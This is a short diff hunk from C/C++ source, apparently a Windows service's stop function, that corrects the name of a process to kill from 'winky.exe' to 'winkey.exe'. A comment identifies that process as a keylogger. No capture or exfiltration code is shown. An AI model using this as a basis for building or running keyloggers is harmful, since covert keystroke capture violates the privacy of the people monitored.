@@ -146,7 +146,7 @@ int SvcStop()
 
     // If the service is running, keyloger must be stopped first.
 
-    killProcessByName("winky.exe");
+    killProcessByName("winkey.exe");
 
     // Send a stop code to the service.
 
